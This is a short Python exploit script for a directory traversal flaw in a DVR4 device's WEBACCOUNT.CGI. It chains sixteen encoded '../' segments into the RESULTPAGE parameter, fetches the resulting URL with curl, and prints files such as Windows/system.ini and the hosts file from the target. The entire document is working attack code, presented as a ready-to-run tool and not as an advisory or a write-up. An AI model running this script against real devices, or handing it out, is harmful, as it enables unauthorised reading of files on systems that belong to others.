#!/usr/bin/env python3
"""
Directory traversal utility for DVR4 / WEBACCOUNT.CGI
Usage: python3 dirTraverse.py <target> [path]
       python3 dirTraverse.py <target>       (defaults to Windows/system.ini)

<target> can be:
  192.168.1.10              (IP, uses default port 8080)
  192.168.1.10:9090         (IP with custom port)
  http://DVR4:8080          (full URL)
  http://192.168.1.10       (full URL, uses port from URL or default 8080)

Example paths (use forward slashes; script handles encoding):
  Windows/system.ini
  Windows/win.ini
  Windows/System32/drivers/etc/hosts
"""

import subprocess
import sys
import urllib.parse

DEFAULT_PATH = "Windows/system.ini"
DEFAULT_PORT = 8080
DEPTH = 16  # number of ../ traversal segments


def parse_target(target: str) -> tuple[str, int]:
    """Return (host, port) from a bare IP, IP:port, or http://host:port URL."""
    if "://" in target:
        parsed = urllib.parse.urlparse(target)
        host = parsed.hostname
        port = parsed.port or DEFAULT_PORT
    elif ":" in target:
        host, port_str = target.rsplit(":", 1)
        port = int(port_str)
    else:
        host = target
        port = DEFAULT_PORT
    return host, port


def build_url(host: str, port: int, path: str) -> str:
    # Encode each segment of the path with %2F separators
    encoded_path = "%2F".join(urllib.parse.quote(seg, safe="") for seg in path.split("/"))
    traversal = "..%2F" * DEPTH
    result_page = f"{traversal}{encoded_path}"
    return (
        f"http://{host}:{port}/WEBACCOUNT.CGI"
        f"?OkBtn=++Ok++&RESULTPAGE={result_page}"
        f"&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
    )


def main():
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target> [path]")
        sys.exit(1)

    host, port = parse_target(sys.argv[1])
    path = sys.argv[2] if len(sys.argv) >= 3 else DEFAULT_PATH

    url = build_url(host, port, path)
    print(f"[*] Target : {host}:{port}")
    print(f"[*] File   : {path}")
    print(f"[*] URL    : {url}\n")

    result = subprocess.run(
        ["curl", "-s", "-g", url],
        capture_output=True,
        text=True,
    )

    if result.returncode != 0:
        print(f"[!] curl error: {result.stderr.strip()}")
        sys.exit(result.returncode)

    output = result.stdout
    if not output.strip():
        print("[!] Empty response — file may not exist or traversal failed.")
    else:
        print(output)


if __name__ == "__main__":
    main()
